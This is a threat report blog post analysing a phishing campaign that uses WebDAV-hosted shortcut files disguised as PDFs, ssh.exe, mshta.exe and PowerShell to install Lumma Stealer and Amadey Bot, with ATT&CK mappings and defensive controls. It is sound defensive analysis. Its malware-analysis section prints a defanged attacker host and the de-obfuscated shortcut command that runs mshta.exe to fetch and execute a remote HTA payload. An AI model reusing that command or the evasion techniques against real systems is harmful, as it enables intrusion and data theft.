---
layout: post
title: "Leveraging Web-Dav and LOL Bins to deploy Emmental Loader , Lumma stealer and Amadey Bot "
date: 2025-03-28 10:00:00
categories: [Threat-Reports]
image : "/assets/images/4631954.jpg"
---
<html>
  <head>
    <title>Leveraging Web-Dav and LOL Bins to deploy Emmental Loader , Lumma stealer and Amadey Bot </title>
  </head>
  <body>
    <div class="mb-5 pb-5" id="course-chapter-0" ref="course-chapter-0">
      <div class="heading-02 text-white fw-s">{{ chapters[0].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[0].Description }}
          </div>
          <div class="paragraph-02 text-neutral-200">
            The attack typically begins with a <b>phishing lure</b> – often an
            email or compromised website – that tricks users into downloading
            what appears to be a legitimate document (for example, a PDF file)
            but is actually a specially crafted shortcut. Upon execution, the
            malicious .LNK file triggers a multi-stage infection chain through
            the WebDAV protocol, ultimately delivering malware to the victim’s
            machine. This campaign stands out for its
            <b>abuse of legitimate web technologies and Windows components</b>:
            by hosting malware on WebDAV (an HTTP-based file-sharing service)
            and using trusted Windows utilities to execute payloads, the
            attackers can bypass many security controls similar to what is found
            at easy-software.com any.run . The final payloads observed include
            information-stealing malware and remote access trojans, which can
            <b
              >exfiltrate sensitive data and give attackers control of the
              compromised host</b
            >. <br /><br />This report provides a
            <b>comprehensive analysis</b> of the campaign. We detail how the
            attack is carried out—from the initial phishing contact to the
            execution of the malware—while avoiding overly technical payload
            specifics. Key takeaways for defenders include the need for
            heightened awareness of unusual WebDAV activity, strict handling of
            shortcut files, and layered mitigation strategies. The goal is to
            inform both cybersecurity professionals and decision-makers of this
            emerging threat, and to recommend actionable steps to detect and
            disrupt similar attacks in the future.
          </div>
        </div>
      </div>
    </div>
    <div class="mb-5 pb-5" id="course-chapter-1" ref="course-chapter-1">
      <div class="heading-02 text-white fw-s">{{ chapters[1].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[1].Description }}
          </div>
          <div class="paragraph-02 text-neutral-200">
            <div class="subheading-02">
              <b>WebDAV as a Delivery Channel: </b>
            </div>
            <br />
            Threat actors are hosting malicious shortcut files on WebDAV servers
            accessible over HTTP/HTTPS, allowing malware downloads over ports
            commonly allowed through firewalls . In one case, a .LNK file
            disguised as a PDF document was hosted on a WebDAV share (e.g.
            http://;&lt;server&gt;/.../document.pdf.lnk), tricking users into
            downloading what looked like a harmless file according to
            <a
              target="_blank"
              href="https://cyble.com/blog/threat-actor-targets-manufacturing-industry-with-malware/#:~:text=unknown%3B%20however%2C%20the%20attack%20likely,a%20remote%20WebDAV%20share%20at"
              >cyble.com</a
            >
            &nbsp
            <a
              target="_blank"
              href="https://www.cloudsek.com/blog/lumma-stealer-chronicles-pdf-themed-campaign-using-compromised-educational-institutions-infrastructure#:~:text=In%20the%20analyzed%20infrastructure%2C%20malicious,PDF%20due%20to%20its%20icon"
              >cloudsek.com</a
            >
            <div class="subheading-02 mt-5">
              <b>Phishing as Initial Access:</b>
            </div>
            <br />
            The infection chain likely begins with
            <b>spear-phishing emails</b>. In observed incidents, attackers
            emailed targets either a link to a
            <b>ZIP archive containing a malicious shortcut</b> or directly to a
            WebDAV-hosted .LNK file. <br /><br />
            <b>Drive-by downloads</b> were also used: visiting a compromised
            website automatically redirected victims to a WebDAV folder,
            prompting them to download the malicious .LNK file unwittingly.
            <div class="subheading-02 mt-5">
              <b>Malicious Shortcut Execution:</b>
            </div>
            <br />
            Opening the malicious shortcut triggers hidden commands that
            <b>leverage built-in Windows utilities</b> to fetch and run malware.
            For example, a .LNK file can silently execute a command-line that
            launches PowerShell or mshta.exe (a legitimate Microsoft HTML
            application host) to download the next-stage payload. <br /><br />
            In one variant, the shortcut executed cmd.exe to copy a malicious
            batch script from the WebDAV share onto the local system and then
            ran it as presented in the article by
            <a
              href="https://any.run/cybersecurity-blog/client-side-exploitation/"
              >any.run</a
            >. <br /><br />These techniques enable attackers to run code on the
            victim’s system without dropping a conventional executable at first,
            helping evade antivirus detection.
            <div class="subheading-02 mt-5">
              <b>Multi-Stage Infection Chain: </b>
            </div>
            <br />
            The campaign employs a multi-stage approach. The initial .LNK file
            (stage 1) pulls in a secondary script or payload (stage 2) via
            WebDAV or other HTTP requests, which in turn downloads and installs
            the <b>final malware</b> (stage 3). This final payload has been
            identified in different cases as info-stealers (e.g. Lumma Stealer)
            and remote access trojans (e.g. <b>AsyncRAT, Amadey bot</b>), often
            delivered in sequence. <br /><br />The use of stages means the
            <b
              >actual malicious payload is only fetched and executed after
              several steps</b
            >, making detection harder until the last stage when the malware is
            already running.
            <div class="subheading-02 mt-5">
              <b>Evasion and Masquerading: </b>
            </div>
            <br />
            The attackers use <b>evasion techniques</b> to avoid detection and
            user suspicion. The shortcut files are
            <b>masqueraded with double extensions and familiar icons</b>
            (e.g. a file named "Invoice.pdf.lnk" with a PDF icon) to appear
            legitimate. <br /><br />
            The campaign also abuses
            <b>legitimate services and binaries</b>: for instance, hosting
            malicious content on trusted cloud platforms (Dropbox, Cloudflare,
            Google AMP) to blend in with normal traffic , and using Windows
            <b>“living-off-the-land” binaries (LOLBins)</b> like mshta.exe,
            wmic.exe, or even the Windows ssh.exe client to execute malicious
            code. Additionally, command scripts are obfuscated (e.g. PowerShell
            commands with base64 or special characters) to hinder analysis and
            detection.
            <div class="subheading-02 mt-5">
              <b>Targets and Impact:</b>
            </div>
            <br />
            Analysis of the campaign indicates a
            <b>broad targeting scope</b>. Reported incidents have affected
            organizations in
            <b
              >manufacturing, education, finance, healthcare, technology, and
              media sectors</b
            >. <br /><br />
          </div>
        </div>
      </div>
    </div>
    <div class="mb-5 pb-5" id="course-chapter-2" ref="course-chapter-2">
      <div class="heading-02 text-white fw-s">{{ chapters[2].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[2].Description }}
          </div>
          <div class="badge badge-neutral-900 my-4">Informational</div>
          <div class="paragraph-02 text-neutral-200">
            <div class="subheading-02 mt-5">
              <b>Key Judgement</b>
            </div>
            <br />
            This evolving threat
            <b
              >demonstrates attackers’ increasing reliance on legitimate Windows
              functionalities</b
            >
            (e.g., WebDAV, ssh.exe, mshta.exe) to deliver stealthy, fileless,
            multi-stage payloads. If successful, it can lead to
            <b>data theft</b> and <b>further compromise</b>
            of affected endpoints. Similar campaigns have been assessed by
            well-known security vendors in the past such as Cyble , Orange Cyber
            Defence and Zscaler but in isolated incidents ( See references in
            section 8 ) . It has not yet been reported with all 4 malware
            strains chained together in a single infection.
            <div class="subheading-02 mt-5">
              <b>Change Analysis</b>
            </div>
            <br />
            Recent findings show that <b>threat actors are shifting</b> from
            traditional SMB-based lateral movements to <b>WebDAV</b> for initial
            file retrieval, evading standard outbound traffic blocks on port
            445. Additionally, <b>new payload obfuscation</b> methods—such as
            embedding malicious scripts in .mp4 or .pdf overlays—enable
            attackers to slip past basic antivirus signatures and email filters.
            <div class="subheading-02 mt-5">
              <b>Relation to Your Organization</b>
            </div>
            <br />
            <ul>
              <li class="mt-3">
                <b>Sector Targeting: </b>While multiple verticals (including
                manufacturing, technology, and engineering) have been impacted,
                the attacker TTPs are general enough to threaten any sector that
                allows WebDAV or processes LNK/HTML attachments.
              </li>
              <li class="mt-3">
                <b>Prior Detections: </b>If your environment has seen any
                signals of LNK files referencing remote WebDAV or suspicious
                PowerShell commands, this indicates potential overlap with these
                tactics.
              </li>
              <li class="mt-3">
                <b>Vulnerability Leverage:</b>The malware chain relies on user
                interaction (clicking a disguised file) and legitimate OS
                processes, making it critical to enforce policy checks on script
                interpreters and short-cut file execution.
              </li>
            </ul>
            <div class="subheading-02 mt-5">
              <b>Technical Components</b>
            </div>
            <br />
            <ul>
              <li class="mt-3">
                <b>Use of WebDAV</b>
                <ul>
                  <li class="mt-3">
                    <b>WebDAV</b> (Web Distributed Authoring and Versioning) is
                    exploited to fetch malicious shortcuts or payloads over
                    <b>HTTP/HTTPS</b>.
                  </li>
                  <li class="mt-3">
                    <b>Blocking SMB</b> on port 445 alone will not mitigate this
                    threat, as <b>WebDAV</b> communication typically occurs over
                    port <b>80 or 443</b>.
                  </li>
                </ul>
              </li>
              <li class="mt-3">
                <b>Malicious Shortcut Files (.LNK)</b>
                <ul>
                  <li class="mt-3">
                    Shortcut files carry obfuscated commands.
                  </li>
                  <li class="mt-3">
                    Common patterns: <br /><br />
                    Target property references a legitimate Windows binary
                    (e.g., ssh.exe) with hidden arguments. <br />
                    o Arguments include -ProxyCommand, powershell -e
                    &lt;Base64&gt;, or references to a remote HTA script.
                  </li>
                </ul>
              </li>
              <li class="mt-3">
                <b>HTA Obfuscation</b>
                <ul>
                  <li class="mt-3">
                    Attackers hide malicious JavaScript or VBScript in HTA code
                    sections appended to legitimate files (e.g., a .mp4).
                  </li>
                  <li class="mt-3">
                    The script calls external references or extracts inline
                    Base64/AES/RC4-encrypted data for final decryption.
                  </li>
                </ul>
              </li>
              <li class="mt-3">
                <b>PowerShell & Fileless Execution</b>
                <ul>
                  <li class="mt-3">
                    PowerShell scripts remain crucial for “living off the land.”
                  </li>
                  <li class="mt-3">
                    TAs rely on deeply obfuscated commands (iex,
                    wide-character/UTF-16 encoding, custom XOR/AES routines).
                  </li>
                  <li class="mt-3">
                    They often set SecurityProtocol to allow TLS1.2, TLS1.1,
                    TLS1.0, or SSL3 for backward compatibility.
                  </li>
                </ul>
              </li>
              <li class="mt-3">
                <b>DLL Sideloading</b>
                <ul>
                  <li class="mt-3">
                    Legitimate binaries (e.g., mDNSResponder.exe) are replaced
                    or partially overwritten in memory to load malicious code.
                  </li>
                  <li class="mt-3">
                    Memory injection or Reflective DLL loading is used to stay
                    under the radar.
                  </li>
                </ul>
              </li>
            </ul>
            <!-- <div class="subheading-02 mt-5">
                <b>Relation to Your Organization</b>
              </div>
              <br />
              <ul>
                <li class="mt-3"></li>
                <li class="mt-3"></li>
                <li class="mt-3"></li>
              </ul> -->
          </div>
        </div>
      </div>
    </div>
    <div class="mb-5 pb-5" id="course-chapter-3" ref="course-chapter-3">
      <div class="heading-02 text-white fw-s">{{ chapters[3].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[3].Description }}
          </div>
          <div class="badge badge-neutral-900 my-4">Informational</div>
          <div class="paragraph-02 text-neutral-200">
            <table class="table table-striped">
              <thead>
                <tr>
                  <th><b>Tactic</b></th>
                  <th><b>Technique</b></th>
                  <th><b>ID</b></th>
                  <th><b>Procedure </b></th>
                  <th><b>D3FEND (if available)</b></th>
                  <th><b>Deployed Control</b></th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>Initial Access</td>
                  <td>Phishing</td>
                  <td>T1566</td>
                  <td>
                    Attackers send spear-phishing emails or embed malicious
                    links in websites, tricking users into downloading malicious
                    HTML or LNK files.
                  </td>
                  <td>
                    Email <br />
                    Filtering
                  </td>
                  <td>
                    Secure email gateways, user-awareness training, sandbox
                    attachments.
                  </td>
                </tr>
                <tr>
                  <td>Execution</td>
                  <td>Command and Scripting Interpreter</td>
                  <td>T1059</td>
                  <td>
                    Malicious scripts (e.g., PowerShell, cmd.exe) execute the
                    payload after the user opens a disguised .lnk or .html.
                  </td>
                  <td>Process Command-Line Blocking</td>
                  <td>
                    Endpoint Detection & Response (EDR), PowerShell logging,
                    script block logging.
                  </td>
                </tr>
                <tr>
                  <td>Execution</td>
                  <td>PowerShell (Sub-technique)</td>
                  <td>T1059.001</td>
                  <td>
                    Attackers rely on obfuscated PowerShell commands embedded
                    within .lnk or .htA content. Scripts decode additional
                    payloads or download them from C2.
                  </td>
                  <td>Executable Allowlisting</td>
                  <td>
                    Application Control, AMSI integration (Antimalware Scan
                    Interface), restricted PowerShell policies.
                  </td>
                </tr>
                <tr>
                  <td>Execution / Defense Evasion</td>
                  <td>Mshta (Older MITRE)</td>
                  <td>T1170</td>
                  <td>
                    Using mshta.exe with malicious .htA content to execute code
                    in memory. Some references still show T1170 for Mshta in
                    older versions of ATT&CK.
                  </td>
                  <td>Process Injection Detection</td>
                  <td>
                    Command-line monitoring, block mshta.exe if not needed, or
                    restrict to trusted sources.
                  </td>
                </tr>
                <tr>
                  <td>Defense Evasion</td>
                  <td>Mshta (Newer MITRE: System Binary Proxy Execution)</td>
                  <td>T1218.005</td>
                  <td>
                    Adversaries abuse mshta.exe as a LOLBIN to proxy malicious
                    scripts. .HTA code is appended to fake .mp4 or .pdf files,
                    then executed filelessly.
                  </td>
                  <td>Executable Allowlisting</td>
                  <td>
                    AppLocker or WDAC rules to disallow mshta.exe usage except
                    for legitimate workflows.
                  </td>
                </tr>
                <tr>
                  <td>Execution</td>
                  <td>Malicious Link (User Execution)</td>
                  <td>T1204.001</td>
                  <td>
                    Victims click on a malicious link (e.g., hidden in HTML,
                    shortcuts, or emails), triggering download or execution.
                  </td>
                  <td>Network Traffic Community Deviation</td>
                  <td>
                    URL filtering, domain reputation checks, web proxy logs
                    review.
                  </td>
                </tr>
                <tr>
                  <td>Execution</td>
                  <td>Malicious File (User Execution)</td>
                  <td>T1204.002</td>
                  <td>
                    Attackers disguise .lnk or .html as legitimate documents
                    (PDF/MP4 icons). Opening the file initiates execution flow
                    (e.g., launching PowerShell or Mshta).
                  </td>
                  <td>Executable Allowlisting</td>
                  <td>
                    Attachment sandboxing, user education on suspicious file
                    types, block LNK from external sources.
                  </td>
                </tr>
                <tr>
                  <td>Defense Evasion</td>
                  <td>Obfuscated Files or Information</td>
                  <td>T1027</td>
                  <td>
                    Attackers heavily obfuscate code in PowerShell/HTA scripts,
                    embed multi-layer encryption (Base64, RC4, AES), hide script
                    text within legitimate binaries’ overlays.
                  </td>
                  <td>Code Analysis</td>
                  <td>
                    Heuristic & behavior-based detection, manual code review,
                    string decryption detection.
                  </td>
                </tr>
                <tr>
                  <td>Privilege Escalation / Defense Evasion</td>
                  <td>Abuse Elevation Control Mechanism</td>
                  <td>T1548</td>
                  <td>
                    The malware can misuse legitimate processes (e.g., DLL
                    sideloading) or hijack flow to run with elevated permissions
                    if user privileges allow.
                  </td>
                  <td>Elevated Process Whitelisting</td>
                  <td>
                    Least-privilege user accounts, block malicious DLL search
                    paths, ensure UAC is enforced.
                  </td>
                </tr>
                <tr>
                  <td>Defense Evasion</td>
                  <td>Hide Artifacts</td>
                  <td>T1564</td>
                  <td>
                    Stealth techniques such as storing code in memory, injecting
                    into legitimate processes (e.g., msiexec.exe, explorer.exe),
                    and using unconventional file extensions to avoid detection.
                  </td>
                  <td>Process Injection Detection</td>
                  <td>
                    Memory scanning by EDR solutions, monitoring suspicious
                    child processes, hashing in-memory code.
                  </td>
                </tr>
                <tr>
                  <td>Persistence / Defense Evasion</td>
                  <td>Valid Accounts</td>
                  <td>T1078</td>
                  <td>
                    Adversaries may leverage compromised credentials or valid
                    user tokens to maintain persistence and move laterally
                    without raising alerts.
                  </td>
                  <td>Credential Hardening</td>
                  <td>
                    MFA enforcement, password rotation, anomaly detection for
                    credential usage
                  </td>
                </tr>
                <tr>
                  <td>Discovery</td>
                  <td>Query Registry</td>
                  <td>T1012</td>
                  <td>
                    Scripts query registry keys to gather system information,
                    check installed software, or identify security products.
                  </td>
                  <td>Registry Analysis</td>
                  <td>
                    Registry auditing, EDR rules for suspicious registry
                    queries.
                  </td>
                </tr>
                <tr>
                  <td>Discovery</td>
                  <td>System Information Discovery</td>
                  <td>T1082</td>
                  <td>
                    Malware enumerates system attributes—OS version, running
                    processes, etc.—to tailor subsequent payloads or identify
                    sandbox environments.
                  </td>
                  <td>Host Inventory</td>
                  <td>
                    Process monitoring, logging of system calls, environment
                    variable checks.
                  </td>
                </tr>
                <tr>
                  <td>Command and Control</td>
                  <td>Application Layer Protocol</td>
                  <td>T1071</td>
                  <td>
                    Attackers use standard HTTP/HTTPS to download additional
                    scripts (e.g., from WebDAV servers or CDNs) and exfiltrate
                    data,
                  </td>
                  <td>TLS Inspection</td>
                  <td>
                    Web proxy with SSLinterception, domain/IP threat
                    intelligence.
                  </td>
                </tr>
                <tr>
                  <td>Command and Control</td>
                  <td>Non-Standard Encoding</td>
                  <td>T1132.002</td>
                  <td>
                    Threat actors encode payloads using custom Base64, ASCII
                    manipulation, or multi-layer ciphers to hide from
                    signature-based controls.
                  </td>
                  <td>Data Manipulation Detection</td>
                  <td>
                    Content inspection of encoded traffic, advanced script
                    scanning, anomaly detection.
                  </td>
                </tr>
                <tr>
                  <td>Command and Control</td>
                  <td>Non-Standard Port</td>
                  <td>T1571</td>
                  <td>
                    Attackers configure C2 servers to listen on random or
                    high-numbered ports, circumventing simpler firewall rules.
                  </td>
                  <td>Network Traffic Flow Analysis</td>
                  <td>
                    Ingress/egress filtering, only allow necessary
                    ports/protocols, track unusual outbound connections.
                  </td>
                </tr>
                <tr>
                  <td>Execution</td>
                  <td>Serverless Execution</td>
                  <td>T1648</td>
                  <td>
                    Certain attacker infrastructure may leverage serverless
                    platforms (e.g., abusing legitimate CDN or cloud functions)
                    to host malicious scripts or stage payloads.
                  </td>
                  <td>(No direct D3FEND mapping)</td>
                  <td>
                    Cloud posture management, scanning for malicious endpoints
                    on trusted cloud Services
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
    <div class="mb-5 pb-5" id="course-chapter-4" ref="course-chapter-4">
      <div class="heading-02 text-white fw-s">{{ chapters[4].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[4].Description }}
          </div>
          <div class="badge badge-neutral-900 my-4">Informational</div>
          <div class="paragraph-02 text-neutral-200">
            The attack chain involves multiple stages that illustrate how the
            threat actor sequentially moves from initial contact to full
            compromise. Figure 1 below outlines the high-level flow, followed by
            a step-by-step breakdown:
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-1.png"
                class="chapter-img"
              />
              <div class="mt-2">
                High-level Attack Chain Diagram – from phishing lure to WebDAV
                shortcut download, execution, and payload delivery
              </div>
            </div>
            <ol>
              <li class="mt-4">
                <b>Initial Contact – Phishing or Redirect:</b>The victim
                receives a malicious content trigger, typically via email. This
                could be a direct attachment (e.g. a ZIP file containing a
                shortcut) or a URL pointing to a download. In some cases, users
                were led to a compromised website that automatically redirected
                them to a WebDAV server, resulting in an Explorer window or
                download prompt for a file that appears legitimate <br /><br />
                The goal at this stage is to entice the user to click a link or
                open a file, initiating the infection.
              </li>
              <li class="mt-4">
                <b>Connection to Malicious WebDAV Share: </b>As soon as the user
                takes the bait (clicks the link or opens the provided file), the
                victim’s system connects to the attacker's WebDAV server to
                retrieve the malicious .LNK payload. WebDAV, being an extension
                of HTTP, allows the remote file (the shortcut) to be fetched
                over port 80/443 just like a web page according to
                easy-software.com <br /><br />For example, one phishing link led
                to a WebDAV URL
                hxxp://.../Downloads/Instruction_695-18121-002_Rev.PDF.lnk,
                hosting a fake PDF shortcut on a remote server . In another
                variant, the email attachment was an Internet Shortcut file
                (*.url); when launched, this .url file caused the system to
                download the actual .LNK file into a temporary directory (via
                WebDAV) without any further user action. <br /><br />At this
                stage, the malicious shortcut is now on the victim’s machine (in
                memory or disk), poised for execution.
              </li>
              <li class="mt-4">
                <b>Execution of the Malicious Shortcut: </b>The victim
                (believing the file to be benign) attempts to open the
                downloaded "document" — in reality, executing the .LNK file.
                Windows Shortcut (.LNK) files can carry embedded commands in
                their properties, which execute when the shortcut is opened. In
                this campaign, the .LNK is configured to run a hidden command
                that initiates the malware delivery. For instance, an analyzed
                .LNK file contained a command to launch the Windows Command
                Processor (cmd.exe) with parameters: it copied a malicious
                script from the WebDAV share to the local drive and then ran it.
                <br /><br />In another case, the shortcut targeted
                C:\Windows\System32\OpenSSH\ssh.exe (the Windows SSH client)
                instead of the usual cmd.exe, in order to appear less
                suspicious; it exploited SSH’s options to execute a follow-on
                payload via PowerShell.Despite variations, the result is the
                same: the .LNK file covertly executes a command on the victim’s
                system.
              </li>
              <li class="mt-4">
                <b>Command Launch and Payload Download:</b>The command invoked
                by the shortcut now pulls in the next-stage malware. Attackers
                often rely on built-in scripting engines or utilities at this
                stage to fetch and execute code. A common technique observed is
                using PowerShell or WMI (Windows Management Instrumentation) to
                download a malicious script from the attacker’s server.
                <br /><br />
                For example, the .LNK might run a PowerShell one-liner that
                connects back to the WebDAV server (or another URL) to download
                a malicious script or file. In one documented case, the LNK via
                SSH launched a PowerShell command that used mshta.exe
                (Microsoft’s HTML application host) to execute a malicious HTA
                (HTML application) hosted on a cloud service as presented by
                <a
                  target="_blank"
                  href="https://cyble.com/blog/threat-actor-targets-manufacturing-industry-with-malware/#:~:text=Once%20executed%2C%20the%20LNK%20file,exe"
                  >cyble.com</a
                ><br /><br />These living-off-the-land binaries (like
                PowerShell, mshta.exe, cmd.exe, etc.) are legitimate Windows
                programs, so their misuse helps the attack blend in. At this
                point, the malware (or an intermediary dropper) is retrieved
                from the remote location and executed in memory or saved to
                disk.
              </li>
              <li class="mt-4">
                <b>Secondary Execution & Multi-Stage Loading: </b>The downloaded
                payload (often a script or DLL) executes to install the final
                malware. In many cases, the download is a loader or dropper
                whose job is to fetch or unpack the actual malware payload. For
                example, a PowerShell script might reach out to a hard-coded URL
                or cloud service (such as Pastebin or an Amazon S3 bucket) to
                download an encoded malware component. <br /><br />That
                component could be a ZIP archive or an encrypted blob containing
                the final implant. The dropper may then use a technique like DLL
                sideloading or process injection to load the final stage without
                spawning a new suspicious process. <br /><br />
                By the end of this stage, the full malware (e.g. an infostealer
                or RAT) is running on the victim system. Notably, each step in
                this chain can be individually obfuscated or masked (for
                instance, using shortened URLs, encryption, or legitimate
                hosting services) so that no single action clearly exposes the
                malware until the very end.
              </li>
              <li class="mt-4">
                <b>Full Compromise and Objectives: </b> Once the final malware
                is active, it will typically achieve the attacker’s objectives,
                such as stealing data (credentials, browser data, cryptocurrency
                wallets, etc.) and/or establishing remote access for the
                attacker . For instance, Lumma Stealer exfiltrates passwords and
                wallet data, while AsyncRAT provides a backdoor for the
                adversary to control the machine. <br /><br />At this stage, the
                attacker may also take steps to maintain persistence on the
                system (e.g. adding registry run keys or scheduled tasks, though
                those details are part of the payload’s behavior and are
                typically beyond the initial infection chain). The attack chain
                from phishing to final payload can occur in a matter of minutes,
                emphasizing the need for real-time detection at earlier stages
                to prevent damage.
              </li>
            </ol>
            <div class="subheading-02 mt-5">
              <b>Attack Chain Summary:</b>
            </div>
            <br />
            In summary, this WebDAV + LNK campaign follows a classic "delivery –
            execution – payload" pattern with a novel twist on the delivery
            mechanism. By using WebDAV to host malicious content, the attackers
            circumvent some traditional delivery controls (since WebDAV traffic
            looks like normal web traffic) and by using .LNK files, they exploit
            a Windows feature that might be less scrutinized than an EXE. The
            layered approach (phishing lure → WebDAV fetch → LNK execution →
            script download → malware launch) shows a deliberate attempt to
            bypass security filters and sandboxes at each step. Each link in the
            chain is relatively innocuous on its own (e.g. an HTTP request here,
            a PowerShell command there), only becoming malicious when the whole
            sequence completes. This underlines the importance of analyzing
            incidents holistically and monitoring for subtle indicators at each
            stage of execution.
            <br />
          </div>
        </div>
      </div>
    </div>
    <div class="mb-5 pb-5" id="course-chapter-5" ref="course-chapter-5">
      <div class="heading-02 text-white fw-s">{{ chapters[5].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[5].Description }}
          </div>
          <div class="badge badge-neutral-900 my-4">Informational</div>
          <div class="paragraph-02 text-neutral-200">
            <div class="subheading-02">
              <b>WebDAV Requests</b>
            </div>
            <br />
            The infection chain started with a file retrieved via the internet.
            The user was browsing for a certain instructions manual on the web
            and stumbled upon the initial access document.
            <ul>
              <li class="mt-3">
                <b>Rundll32.exe WebDAV attack</b><br /><br />
                For this attack to happen only a HTML file needs to be either
                accessed by accidental web surfing or by receiving it via email
                or other channels. When the user opens the HTML file, a pop up
                appears.
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-2.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 1 : WebDAV Pop-up</div>
                </div>
                <br />This popup is opened automatically when the HTML file is
                being displayed in the browser. It can be clearly seen here that
                the file:// protocol is used, which demands that a specific
                application in Windows Explorer should be opened.
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-3.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">
                    Figure 2 : Usage of davclnt.dll to retrieve file from remote
                    host
                  </div>
                </div>
                <ul>
                  <li class="mt-3">
                    <b>rundll32.exe runs davclnt.dll</b>, which is related to
                    the WebDAV (Web Distributed Authoring and Versioning) client
                    in Windows, allowing users to manage files on web servers or
                    web shares (practically network file access via HTTP and
                    HTTPS)
                  </li>
                  <li class="mt-3">
                    <b>DavSetCookie</b>– legitimate function within davclnt.dll
                    used to manage authentication cookies
                  </li>
                  <li class="mt-3">
                    <b
                      >Download[-]695-18112-001-webdav-logicaldoc[.]cdn-serveri4731-ns[.]shop@SSL </b
                    >– This is the hostname that hosts the malicious file .
                    Basically, the domain/webserver/host that keeps the
                    Instruction_6955.PDF.lnk
                  </li>
                </ul>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-4.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 3 : .lnk file retrieval</div>
                </div>
                <br />
                At this stage of the attack, the user selected Open Windows
                Explorer, which triggered a WebDAV connection to an external
                server. This action resulted in the user seeing a "search
                result" . The file returned was an LNK shortcut file, designed
                to execute additional commands when launched.
                <br /><br />This is interesting from a monitoring and
                threat-hunting perspective. However, blocking outgoing SMB
                traffic on port 445/TCP on the firewall will not stop this
                attack because WebDav is using HTTP.
              </li>
              <li class="mt-3">
                <b>Malicious PDF/LNK document </b>The retrieved file has a .pdf
                icon to mask its initial purpose and persuade the user to open
                it to reveal its contents . An encoded script that appears to be
                PowerShell, along with a file path, a Security Identifier (SID),
                and references to SSH was identified as the file metadata. This
                strongly indicates that the file in question is not a legitimate
                PDF, but rather a malicious command line execution embedded
                within a .lnk (shortcut) file. If executed, this could
                potentially download, execute, or exfiltrate data using SSH.
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-5.png"
                    class="chapter-img"
                  />
                </div>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-6.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 4 : Cmd line arguments in .lnk</div>
                </div>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-7.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 5 : File matadata</div>
                </div>
                <br />
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-8.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 6 : De-obfuscated cmd line</div>
                </div>
                <br />
                The LNK file will run ssh.exe
                (C:\Windows\System32\OpenSSH\ssh.exe) with the following
                parameter: mshta.exe hxxps[:]//klimpmybekoeshop[/]DUV[.]mp4 .
                <br /><br />Edge Executable Reference:
                <ul>
                  <li class="mt-2">
                    <b
                      >The reference to msedge.exe might be part of a secondary
                      payload delivery method.</b
                    >
                  </li>
                  <li class="mt-2">
                    <b
                      >It could be used to launch legitimate-looking browser
                      activity to evade detection.</b
                    >
                  </li>
                </ul>
              </li>
              <li class="mt-3">
                <b>Mp4 Media-File dropped by the LNK file</b><br /><br />Next in
                the infection chain a .mp4 file is downloaded from the. shop web
                resource, which is executed using powershell. In this case
                mshta.exe is being used to execute the remote MP4 file.
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-9.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">
                    Figure 8 : Payload retrieval via mshta.exe
                  </div>
                </div>
                <div class="mt-4 text-center">
                  <img
                    src="/assets/images/multistage-malware-10.png"
                    class="chapter-img"
                  />
                  <div class="mt-2">Figure 9 : Initial Execution Flow</div>
                </div>
                <br /><br />mshta.exe is used to execute an HTA payload hidden
                within a legitimate file downloaded from an attacker-controlled
                C2 server. While the file appears to be a standard MP4, it is
                actually padded with HTA data containing malicious JavaScript.
                <br /><br />
                Once mshta.exe processes the file, the JavaScript payload
                executes, decoding and running a decrypted PowerShell script.
                This script then loads an obfuscated PowerShell loader, which
                retrieves and executes Lumma Stealer. Additionally, the attack
                chain embeds HijackLoader, which subsequently drops Amadey Bot
                onto the compromised endpoint.
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
    <div class="mb-5 pb-5" id="course-chapter-6" ref="course-chapter-6">
      <div class="heading-02 text-white fw-s">{{ chapters[6].Name }}</div>
      <div class="row mt-4 pt-3">
        <div class="col-xxl">
          <div class="paragraph-02 text-neutral-200">
            {{ chapters[6].Description }}
          </div>
          <div class="badge badge-neutral-900 my-4">Informational</div>
          <div class="paragraph-02 text-neutral-200">
            According to Orange Cyber Defense, this attack follows the second
            infection chain currently being tracked, specifically WebDAV server
            exploitation leading to Emmenthal. <br /><br />
            Once the WebDAV compromise occurs and the malicious .lnk file is
            executed, mshta.exe begins processing the disguised MP4 "movie"
            file. A closer inspection using HxD reveals genuine MP4 metadata,
            aligning with standard MP4 file structure, but embedded with hidden
            HTA payload data.
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-11.png"
                class="chapter-img"
              />
              <div class="mt-2">Figure 10 : MP4 metadata</div>
            </div>
            <br /><br />Mp4 is a multimedia container format designed to store
            video, audio, subtitles, and metadata. Typically, these do not
            contain any executable code, scripts, or other artifacts resembling
            int, bool, while, or &lt;script&gt; tags .
            <div class="mt-4 text-center">
              <img
                src="/assets/images/multistage-malware-12.png"
                class="chapter-img"
              />
